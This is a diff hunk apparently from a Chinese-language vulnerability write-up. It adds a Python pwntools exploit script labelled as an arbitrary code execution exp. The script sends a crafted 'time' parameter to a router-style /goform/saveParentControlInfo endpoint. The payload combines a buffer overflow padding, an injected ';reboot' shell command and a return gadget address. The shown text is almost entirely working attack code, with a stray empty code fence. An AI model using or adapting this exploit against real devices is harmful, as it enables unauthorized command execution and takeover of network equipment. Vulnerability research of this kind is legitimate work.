@@ -28,3 +28,22 @@
 
 任意代码执行的exp：
 
+```http
+
+```python
+from pwn import*
+import requests
+
+url = "https://192.168.2.1/goform/saveParentControlInfo"
+
+gadget = 0x37208
+
+time =  b"a" * 0x58
+time += b";reboot" # command you want to execute
+time += b"-"
+time += b"b" * 0x34
+time += p32(gadget)
+
+r = requests.post(url, data = {"time":time},verify=False )
+
+```
